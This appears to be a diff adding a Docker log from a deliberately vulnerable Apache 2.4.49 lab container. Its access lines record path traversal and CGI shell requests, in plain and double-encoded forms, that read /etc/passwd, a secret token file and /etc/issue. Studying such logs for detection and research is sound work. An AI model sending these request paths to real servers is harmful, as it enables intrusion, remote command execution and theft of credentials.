@@ -1,0 +1,18 @@
+﻿cve_lab_vulnerable  | AH00558: httpd: Could not reliably determine the server's fully qualified domain name, using 172.20.0.2. Set the 'ServerName' directive globally to suppress this message
+cve_lab_vulnerable  | AH00558: httpd: Could not reliably determine the server's fully qualified domain name, using 172.20.0.2. Set the 'ServerName' directive globally to suppress this message
+cve_lab_vulnerable  | [Fri Sep 18 15:20:33.086498 2026] [mpm_event:notice] [pid 1:tid 126136439886976] AH00489: Apache/2.4.49 (Unix) configured -- resuming normal operations
+cve_lab_vulnerable  | [Fri Sep 18 15:20:33.086833 2026] [core:notice] [pid 1:tid 126136439886976] AH00094: Command line: 'httpd -D FOREGROUND'
+cve_lab_vulnerable  | 172.20.0.1 - - [18/Sep/2026:15:20:37 +0000] "GET /icons/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1" 200 926 "-" "curl/8.13.0"
+cve_lab_vulnerable  | 172.20.0.1 - - [18/Sep/2026:15:20:46 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 45 "-" "curl/8.13.0"
+cve_lab_vulnerable  | 172.20.0.1 - - [18/Sep/2026:15:21:35 +0000] "GET / HTTP/1.1" 200 60 "-" "-"
+cve_lab_vulnerable  | 172.20.0.1 - - [18/Sep/2026:15:21:35 +0000] "GET /icons/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1" 200 926 "-" "CVE-Lab-Validator/1.0 (Research Only)"
+cve_lab_vulnerable  | 172.20.0.1 - - [18/Sep/2026:15:21:35 +0000] "GET /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd HTTP/1.1" 200 926 "-" "CVE-Lab-Validator/1.0 (Research Only)"
+cve_lab_vulnerable  | 172.20.0.1 - - [18/Sep/2026:15:21:36 +0000] "GET / HTTP/1.1" 200 60 "-" "-"
+cve_lab_vulnerable  | 172.20.0.1 - - [18/Sep/2026:15:21:36 +0000] "GET /icons/.%2e/.%2e/.%2e/.%2e/var/secret/confidential_token.txt HTTP/1.1" 200 45 "-" "CVE-Lab-Validator/1.0 (Research Only)"
+cve_lab_vulnerable  | 172.20.0.1 - - [18/Sep/2026:15:21:36 +0000] "GET /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/var/secret/confidential_token.txt HTTP/1.1" 200 45 "-" "CVE-Lab-Validator/1.0 (Research Only)"
+cve_lab_vulnerable  | 172.20.0.1 - - [18/Sep/2026:15:21:46 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 174 "-" "CVE-Lab-Validator/1.0 (Research Only)"
+cve_lab_vulnerable  | 172.20.0.1 - - [18/Sep/2026:15:21:46 +0000] "POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1" 200 174 "-" "CVE-Lab-Validator/1.0 (Research Only)"
+cve_lab_vulnerable  | 172.20.0.1 - - [18/Sep/2026:15:21:46 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 45 "-" "CVE-Lab-Validator/1.0 (Research Only)"
+cve_lab_vulnerable  | 172.20.0.1 - - [18/Sep/2026:15:21:46 +0000] "POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1" 200 45 "-" "CVE-Lab-Validator/1.0 (Research Only)"
+cve_lab_vulnerable  | 172.20.0.1 - - [18/Sep/2026:15:21:56 +0000] "GET / HTTP/1.1" 200 60 "-" "CVE-Lab-Scanner/1.0 (Security Research)"
+cve_lab_vulnerable  | 172.20.0.1 - - [18/Sep/2026:15:21:56 +0000] "GET /icons/.%2e/.%2e/.%2e/.%2e/etc/issue HTTP/1.1" 200 51 "-" "CVE-Lab-Scanner/1.0 (Security Research)"
